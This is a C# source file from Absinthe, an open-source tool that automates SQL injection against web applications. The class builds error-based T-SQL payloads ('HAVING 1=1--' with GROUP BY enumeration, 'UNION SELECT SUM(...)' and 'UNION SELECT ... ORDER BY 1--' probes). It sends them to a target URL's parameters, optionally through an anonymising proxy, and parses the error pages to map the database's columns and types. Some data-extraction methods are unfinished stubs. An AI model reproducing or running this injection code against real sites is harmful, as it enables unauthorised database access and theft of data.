/*****************************************************************************
   Absinthe Core - The Automated Blind SQL Injection Library
   This software is Copyright (C) 2004  nummish, 0x90.org

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
******************************************************************************/

using System;
using System.Text;
using System.Collections;
using System.Collections.Specialized;
using System.Net;
using System.IO;
using System.Xml;
#if FULL_RELEASE
namespace Absinthe.Core
{
	public class SqlErrorAttackVector : AttackVector
	{

		private bool _ConnectViaPost;
		private string _TargetURL;
		private string _VectorName;
		private string _VectorBuffer;
		private StringDictionary _AttackParams;
		private ArrayList _QueryStructure;
		private WebProxy _Proxy;
		private StringDictionary _Cookies;
		private GlobalDS.OutputStatusDelegate _ParentOutput;

		// {{{ Constructors
		public SqlErrorAttackVector(string URL, string VectorName, string VectorBuffer, StringDictionary AdditionalParams, string Method, GlobalDS.OutputStatusDelegate ParentOutput, WebProxy AnonProxy, StringDictionary Cookies)
		{
			_ParentOutput = ParentOutput;
			_Proxy = AnonProxy;
			_Cookies = Cookies;
			Initialize(URL, VectorName, VectorBuffer, AdditionalParams, Method);
		}

		public SqlErrorAttackVector(string URL, string VectorName, string VectorBuffer, StringDictionary AdditionalParams, string Method, GlobalDS.OutputStatusDelegate ParentOutput, WebProxy AnonProxy)
		{
			_ParentOutput = ParentOutput;
			_Proxy = AnonProxy;
			Initialize(URL, VectorName, VectorBuffer, AdditionalParams, Method);
		}

		public SqlErrorAttackVector(string URL, string VectorName, string VectorBuffer, StringDictionary AdditionalParams, string Method, GlobalDS.OutputStatusDelegate ParentOutput, StringDictionary Cookies)
		{
			_ParentOutput = ParentOutput;
			_Cookies = Cookies;
			Initialize(URL, VectorName, VectorBuffer, AdditionalParams, Method);
		}

		public SqlErrorAttackVector(string URL, string VectorName, string VectorBuffer, StringDictionary AdditionalParams, string Method, GlobalDS.OutputStatusDelegate ParentOutput)
		{
			_ParentOutput = ParentOutput;
			Initialize(URL, VectorName, VectorBuffer, AdditionalParams, Method);
		}

		public SqlErrorAttackVector(string URL, string VectorName, string VectorBuffer, StringDictionary AdditionalParams, string Method, WebProxy AnonProxy, StringDictionary Cookies)
		{
			_Proxy = AnonProxy;
			_Cookies = Cookies;
			Initialize(URL, VectorName, VectorBuffer, AdditionalParams, Method);
		}
		
		public SqlErrorAttackVector(string URL, string VectorName, string VectorBuffer, StringDictionary AdditionalParams, string Method, WebProxy AnonProxy)
		{
			_Proxy = AnonProxy;
			Initialize(URL, VectorName, VectorBuffer, AdditionalParams, Method);
		}

		public SqlErrorAttackVector(string URL, string VectorName, string VectorBuffer, StringDictionary AdditionalParams, string Method, StringDictionary Cookies)
		{
			_Cookies = Cookies;
			Initialize(URL, VectorName, VectorBuffer, AdditionalParams, Method);
		}
		
		public SqlErrorAttackVector(string URL, string VectorName, string VectorBuffer, StringDictionary AdditionalParams, string Method)
		{
			Initialize(URL, VectorName, VectorBuffer, AdditionalParams, Method);
		}

		public SqlErrorAttackVector(string URL, string Method, ArrayList ElementList, string VectorName, string VectorBuffer, StringDictionary AttackParams)
		{
			_TargetURL = URL;
			_ConnectViaPost = Method.ToUpper().Equals("POST"); 
			_QueryStructure = ElementList;
			_VectorName = VectorName;
			_VectorBuffer = VectorBuffer;
			_AttackParams = AttackParams;
		}
		// }}}

		// {{{ Initialize
		private void Initialize(string URL, string VectorName, string VectorBuffer, StringDictionary AdditionalParams, string Method)
		{
			_ConnectViaPost = String.Equals(Method.ToUpper(), "POST");
			_TargetURL = URL;
			_VectorName = VectorName;
			_VectorBuffer = VectorBuffer;
			_AttackParams = AdditionalParams;

			//_ParentOutput("Enumerating Attack Vector");
			EnumerateAttackVector();

			//_ParentOutput("Typecasting Attack Vector");
			TypeCastAttackVector();

			//_ParentOutput("Refining Attack Vector Typecasts");
			RefinedTypeCasting();
		}
		// }}}

		// {{{ TypeCastAttackVector
		private void TypeCastAttackVector()
		{
			StringBuilder CurrentVector = new StringBuilder();

			for (int FieldCounter = 0; FieldCounter < _QueryStructure.Count; FieldCounter++)
			{
				_ParentOutput(String.Format("Counter is at {0} of {1}", FieldCounter, _QueryStructure.Count));

				CurrentVector = new StringBuilder();
				CurrentVector.Append(_VectorBuffer).Append(" UNION SELECT SUM(");
				CurrentVector.Append(((GlobalDS.Field)_QueryStructure[FieldCounter]).FullName);
				CurrentVector.Append(") FROM ");
				CurrentVector.Append(((GlobalDS.Field)_QueryStructure[FieldCounter]).TableName);
				CurrentVector.Append("--");

				_AttackParams[_VectorName] = CurrentVector.ToString();

				string ResultPage;
				ResultPage = httpConnect.PageRequest(_TargetURL, _AttackParams, _Proxy, _ConnectViaPost, _Cookies, _ParentOutput);

				GlobalDS.Field dbg = (GlobalDS.Field) _QueryStructure[FieldCounter];
				dbg.DataType = ParsePage.ParseUnionSumError(ResultPage, _ParentOutput);

				// ## DEBUG
				_ParentOutput(String.Format("Resulting Data: {0} - {1}", dbg.FullName, dbg.DataType));
				_QueryStructure[FieldCounter] = dbg;
			}


		}
		// }}}

		// {{{ FindAllInts
		private ArrayList FindAllInts(ArrayList QueryStructure)
		{
			ArrayList retVal = new ArrayList();

			for (int Counter = 0; Counter < QueryStructure.Count; Counter++)
			{
				if (((GlobalDS.Field)_QueryStructure[Counter]).DataType == System.Data.SqlDbType.Int)
				{
					retVal.Add(Counter);
				}
			}

			return retVal;
		}
		// }}}

		// {{{ RefinedTypeCasting
		private void RefinedTypeCasting()
		{
			StringBuilder CurrentVector = new StringBuilder();

			ArrayList IntList = FindAllInts(_QueryStructure);

			for (int IntCounter = 0; IntCounter < IntList.Count; IntCounter++)
			{
				//_ParentOutput("Refining Integer #" + IntCounter);

				CurrentVector = new StringBuilder();
				CurrentVector.Append(_VectorBuffer).Append(" UNION SELECT ");


				for (int FieldCounter = 0; FieldCounter < _QueryStructure.Count; FieldCounter++)
				{
					if (FieldCounter == (int) IntList[IntCounter])
					{
						//CurrentVector.Append("@@version,");
						CurrentVector.Append("char(0x61),");
					}
					else
					{
						CurrentVector.Append("1,");
					}

				}
				CurrentVector.Remove(CurrentVector.Length - 1, 1);

				CurrentVector.Append(" ORDER BY 1--");

				_AttackParams[_VectorName] = CurrentVector.ToString();

				string ResultPage;

				ResultPage = httpConnect.PageRequest(_TargetURL, _AttackParams, _Proxy, _ConnectViaPost, _Cookies, _ParentOutput);

				GlobalDS.Field AdjustedField = (GlobalDS.Field) _QueryStructure[(int) IntList[IntCounter]];

				AdjustedField.DataType = ParsePage.ParseUnionSelectForIntegerRefinement(ResultPage, _ParentOutput);

				_QueryStructure[(int) IntList[IntCounter]] = AdjustedField;

			}

			//_ParentOutput("Finished Refining Typecasts");

		}
		// }}}

		// {{{ EnumerateAttackVector
		private void EnumerateAttackVector()
		{
			StringBuilder CurrentVector;
			// Initiate "Having" enumeration
			GlobalDS.Field newField;

			_QueryStructure = new ArrayList();

			_ParentOutput(String.Format("QueryStructure Size: {0}", _QueryStructure.Count));

			do
			{
				CurrentVector = new StringBuilder();
				CurrentVector.Append(_VectorBuffer);

				// This is where the GROUP BY clause is added
				if (_QueryStructure.Count > 0)
				{
					CurrentVector.Append(" GROUP BY");

					for (int FieldCounter = 0; FieldCounter < _QueryStructure.Count; FieldCounter++)
					{
						CurrentVector.Append(" ");
						CurrentVector.Append(((GlobalDS.Field)_QueryStructure[FieldCounter]).FullName);
						//CurrentVector.Append(((GlobalDS.Field)_QueryStructure[FieldCounter]).FieldName);
						CurrentVector.Append(",");
					}

					CurrentVector.Remove(CurrentVector.Length - 1, 1);
				}

				CurrentVector.Append(" HAVING 1=1--");

				_AttackParams[_VectorName] = CurrentVector.ToString();

				string ResultPage;
				ResultPage = httpConnect.PageRequest(_TargetURL, _AttackParams, _Proxy, _ConnectViaPost, _Cookies, _ParentOutput);

				newField = ParsePage.ParseGroupedHaving(ResultPage);

				if (newField.FieldName.Length > 0)
				{
					_QueryStructure.Add(newField);
					_ParentOutput(String.Format("QueryStructure Size After adding: {0}", _QueryStructure.Count));
				}
				else
				{
					_ParentOutput(ResultPage);
				}

			}while (newField.FieldName.Length > 0);

		}
		// }}}

		// {{{ ToXml
		public void ToXml(ref XmlTextWriter xOutput)
		{

			xOutput.WriteStartElement("attackvector");
			GlobalDS.Field[] av = (GlobalDS.Field[]) _QueryStructure.ToArray(typeof(GlobalDS.Field));

			xOutput.WriteStartAttribute("name", null);
			xOutput.WriteString(_VectorName);
			xOutput.WriteEndAttribute();

			xOutput.WriteStartAttribute("buffer", null);
			xOutput.WriteString(_VectorBuffer);
			xOutput.WriteEndAttribute();

			xOutput.WriteStartAttribute("type", null);
			xOutput.WriteString(this.ExploitType.ToString());
			xOutput.WriteEndAttribute();

			for (int i = 0; i < av.Length; i++)
			{
				xOutput.WriteStartElement("entry");

				xOutput.WriteStartAttribute("field", null);
				xOutput.WriteString(av[i].FieldName);
				xOutput.WriteEndAttribute();

				xOutput.WriteStartAttribute("table", null);
				xOutput.WriteString(av[i].TableName);
				xOutput.WriteEndAttribute();

				xOutput.WriteStartAttribute("datatype", null);
				xOutput.WriteString(av[i].DataType.ToString());
				xOutput.WriteEndAttribute();

				xOutput.WriteStartAttribute("seq", null);
				xOutput.WriteString(i.ToString());
				xOutput.WriteEndAttribute();

				xOutput.WriteEndElement();
			}

			xOutput.WriteEndElement();
		}
		// }}}

		// {{{ ExploitType Property
		public GlobalDS.ExploitType ExploitType
		{
			get
			{
				return GlobalDS.ExploitType.ErrorBasedTSQL;
			}
		}
		// }}}

		public void PopulateTableStructure(ref GlobalDS.Table TableData)
		{
			// TODO: Finish this
		}
		// {{{ Proxy Property
		public WebProxy Proxy
		{
			set
			{
				_Proxy = value;
			}
		}
		// }}}

		// {{{ GetDatabaseUsername
		public string GetDatabaseUsername()
		{
			// TODO: Write this
			return "";
		}
		// }}}

		// {{{ GetTableList
		public GlobalDS.Table[] GetTableList()
		{
			// TODO: Finish this
			return null;
		}	
		// }}}

		public void PullDataFromTable(GlobalDS.Table[] SrcTable, long[][] ColumnIDs, string xmlFilename)
		{
			// TODO: Finish this
		}
		
		
	}
}
#endif
